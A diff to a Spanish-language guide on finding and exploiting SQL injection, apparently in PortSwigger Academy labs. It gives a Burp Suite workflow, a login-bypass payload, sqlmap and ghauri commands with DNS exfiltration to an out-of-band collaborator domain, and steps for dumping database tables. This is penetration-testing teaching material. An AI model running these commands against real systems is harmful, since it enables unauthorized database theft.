@@ -768,21 +768,33 @@ Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación
 
 Teniendo en cuenta que `los términos y herramientas mencionados a continuación` se `encuentran` en la `cheatsheet mencionada anteriormente`, llevaremos a cabo los siguientes pasos:
 
-1 - `Instalar` las extensiones `Active Scan ++`, `Error Message Checks`, `Additional Scanner Checks`, `Collaborator Everywhere` y `Backslash Powered Scanner` de `Burpsuite`
+1 - `Instalar` las extensiones `Hackvertor`, `Active Scan ++`, `Error Message Checks`, `Additional Scanner Checks`, `Collaborator Everywhere`, `SQLmap DNS Collaborator` y `Backslash Powered Scanner` de `Burpsuite`
 
 2 - `Añadir` el `dominio` y sus `subdominios` al `scope`
 
 3 - Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`
 
-4 - `Escanearemos partes específicas de la petición` usando el `escáner de Burpsuite`. Para `escanear` los `insertion points` debemos seleccionar en `tipo de escaneo` la opción `Audit selected items`
+4 - Interactuar manualmente con todas las funcionalidades del sitio web. Una vez hecho revisamos las peticiones, las que consideremos que tinen insertion points interesantes (cookies, parámetros de consulta, datos por POST) las mandamos al Intruder, marcamos las partes que queremos escanear y hacemos click derecho > Scan defined insertion points. Cuando se nos abra el menú debemos seleccionar en `tipo de escaneo` la opción `Audit selected items`
 
-5 - `Analizar la query con sqlmap 2 veces`, debido a que `puede fallar en ocasiones`
+5 - Si hay un `panel de login` podemos intentar `hacer` un `login bypass` con la típica inyección `' or 1=1-- -` antes de lanzar sqlmap, ghauri o escanear los insertion points
 
-6 - `Analizar la query con ghauri 2 veces` para `confirmar que sqlmap no se saltó nada`
+5 - `Analizar la query con sqlmap 2 veces`, debido a que `puede fallar en ocasiones`. Antes de lanzar sqlmap nos vamos a Burpsuite y cargamos la extensión SQLMap DNS Collaborator y nos copiamos el ese parámetro para usarlo en sqlmap. Lo primero que vamos a hacer es listar la versión con --banner, seguidamente la base de datos actual con --current-db, luego las bases de datos existentes con --dbs, posteriormente seleccionamos la base de datos que nos interese y listamos sus tablas con -D nombreBaseDeDatos --tables, lo siguiente es seleccionar la tabla que nos interese y listar sus columnas con -D nombreBaseDeDatos -T nombreTabla --columns y finalmente seleccionamos las columnas que nos interesen y dumpeamos su contenido con -D nombreBaseDeDatos -T nombreTabla -C columna1,columna2 --dump
 
-7 - Realizar un `ataque de fuerza bruta` con el `Intruder` y los `diccionarios` de `Loxs`. Si no encontramos nada, usaremos los `payloads` de los `diccionarios` mencionados en `hacking tools` que contengan `payloads` de `SQLI` y si tampoco encontramos nada, usar la extensión `Agartha` de `Burpsuite`. Es recomendable setear la opción `Delay between requests` en `1` y desactivar el `Automatic throttling` para que `el tiempo de respuesta del servidor varíe lo menos posible`. También debemos `disminuir` el `número de hilos` para `no colapsar` el `servidor`
+```
+sudo sqlmap -u 'https://0a050082031237258094306d00be0099.web-security-academy.net/' --cookie="TrackingId=pSWRRS0IQHT5vBjp*; session=AQlmdQgzhyO3dxWbUFsAHJCHQzDUK9ST" --risk=3 --level=5 --dns-domain=9180tced6onerv845e8zg0m8pzvpje.oastify.com --random-agent --batch --insertarParámetrosMencionadosArriba
+```
 
-8 - Si lo anterior no funciona, nos centraremos en buscar `SQL injections de forma manual` utilizando las `cheatsheets` de `Portswigger`, `PayloadsAllTheThings` y `Hacktricks`. Si vemos `payloads` o `diccionarios` para aplicar `fuerza bruta` debemos probarlos
+6 - Mientras sqlmap está corriendo, `analizamos la query con ghauri 2 veces` para `confirmar que sqlmap no se saltó nada`. Lo primero que vamos a hacer es listar la versión con --banner, seguidamente la base de datos actual con --current-db, luego las bases de datos existentes con --dbs, posteriormente seleccionamos la base de datos que nos interese y listamos sus tablas con -D nombreBaseDeDatos --tables, lo siguiente es seleccionar la tabla que nos interese y listar sus columnas con -D nombreBaseDeDatos -T nombreTabla --columns y finalmente seleccionamos las columnas que nos interesen y dumpeamos su contenido con -D nombreBaseDeDatos -T nombreTabla -C  columna1,columna2 --dump
+
+```
+ghauri -u 'https://0a050082031237258094306d00be0099.web-security-academy.net/' --cookie="TrackingId=pSWRRS0IQHT5vBjp*; session=AQlmdQgzhyO3dxWbUFsAHJCHQzDUK9ST" --level=3 --random-agent --batch --insertarParámetrosMencionadosArriba
+```
+
+7 - Si tenemos algún problema con las queries de ghauri o de sqlmap podemos usar el parámetro --flush-session que borra todo lo descubierto y empieza de nuevo o el parámetro --fresh-queries que hace que sqlmap y ghauri recuerden el punto de inyección pero realizan las queries para listar bases de datos, tablas, columnas etc nuevamente. Es decir, si ahy problemas a la hora de etectar el punto de inyección, usamos --flush-session y si hay problema a la hora de extraer datos usamos --fresh-queries
+
+8 - Si vemos que sqlmap o ghauri no pueden ejecutar la consulta bien pero ya hemos detectado la SQLI ya sea mediante sqlmap, ghauri o analizando los insertion points vamos a llevar a cabo la explotación manualmente. Para ayudarnos podemos usar la cheatsheet de SQLI de Portswigger [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) y los posts mencionados en esta sección de la guía [https://justice-reaper.github.io/posts/SQLI-Guide/#ejemplos-de-tipos-de-sql-injections](https://justice-reaper.github.io/posts/SQLI-Guide/#ejemplos-de-tipos-de-sql-injections). Si la SQLI que estamos explotando no se da tal cual se muestra en los posts podemos pasarle la cheathseet de SQLI de Portswigger a la IA para que nos ayude a elaborar un payload válido 
+
+9 - Puede darse el caso en que los datos por POST se transmitan en formato XML, para estos casos es mejor hacerlo de forma manual porque es más cómodo.
 
 ## Prevenir SQL injections
 
